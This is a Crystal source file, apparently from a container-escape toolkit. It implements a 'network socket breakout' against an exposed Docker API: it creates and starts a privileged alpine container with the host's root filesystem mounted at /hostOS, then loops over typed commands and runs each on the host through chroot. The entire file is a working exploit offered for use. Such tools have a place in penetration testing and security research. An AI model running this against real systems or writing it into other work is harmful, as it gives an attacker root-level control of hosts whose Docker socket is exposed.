require "http"
require "json"

def network_socket_breakout(ip)
    print_network_socket_breakout_banner()
    id = create_breakout_container(ip)
    puts("==> Created container: #{id}")
    start_breakout_container(ip,id)
    puts("==> Started container: #{id}")
    puts("Started a privileged container with the host OS filesystem mounted. ".green())
    handle_input(ip,id)
    exit()
end

def handle_input(ip,id)
    while(true)
        puts("•  Enter command to run or nothing to exit")
        command = gets
        if command && command.size() > 0
            puts("==>Sending command \"#{command}\" to container: #{id}".green)
            run_exec(ip,create_exec(ip,id,command))
        else
            exit()
        end
    end
end

def create_breakout_container(ip)
    begin 
        post_data = {"Image": "alpine", "Cmd": "/bin/sh", "privileged": true, "AttachStdin": false,"AttachStdout": true,"AttachStderr": true,"Tty": true,"HostConfig": {"Binds": ["/:/hostOS"],}}.to_json
        resp = HTTP::Client.post("#{ip}containers/create",  headers: HTTP::Headers{"Content-Type"=> "application/json"}, body: post_data)
        if resp != nil && resp.status_code == 201 && !resp.body.empty?
            return JSON.parse(resp.body)["Id"]
        else
            raise("Non 200 response from docker socket\n#{resp.body}")
        end
    rescue e
      puts("Error occured attempting escape on #{ip}\n#{e}")
    end
end

def start_breakout_container(ip,id)
    begin 
        resp = HTTP::Client.post("#{ip}containers/#{id}/start", headers: HTTP::Headers{"Content-Type"=> "application/json"})   
        raise("Non 200 response from docker socket\n#{resp.body}") if resp == nil && resp.status_code != 204 
    rescue e
        puts("•  Error occured attempting escape on #{ip}\n#{e}".red)
    end
end

def create_exec(ip,id,command)
    begin 
        exec_data = {"AttachStdout": true, "AttachStdin": false, "Tty": true, "Cmd": [ "sh", "-c", "chroot /hostOS /bin/sh -c \"#{command}\""]}.to_json
        resp = HTTP::Client.post("#{ip}containers/#{id}/exec", headers: HTTP::Headers{"Content-Type"=> "application/json"}, body: exec_data)
        if resp != nil && resp.status_code == 201
            return JSON.parse(resp.body)["Id"]
        else
            raise("Non 200 response from docker socket\n#{resp.body}")
        end
    rescue e
        puts("• Error occured attempting escape on #{ip}\n#{e}".red)
    end
end

def run_exec(ip,exec_id)
    begin
        resp = HTTP::Client.post("#{ip}exec/#{exec_id}/start", headers: HTTP::Headers{"Content-Type"=> "application/json"}, body: {"Detach": false, "Tty": true}.to_json)
        if resp != nil && resp.status_code == 200
            puts("==> Container response received \n")
            puts(resp.body.yellow)
        else
            raise("Non 200 response from docker socket\n#{resp.body}")
        end
    rescue e
        puts("•  Error occured attempting escape on #{ip}\n#{e}".red)
    end
end

def print_network_socket_breakout_banner
    puts("\n================================================")
    puts("===========  Network Socket Breakout ===========".green)
    puts("================================================")
end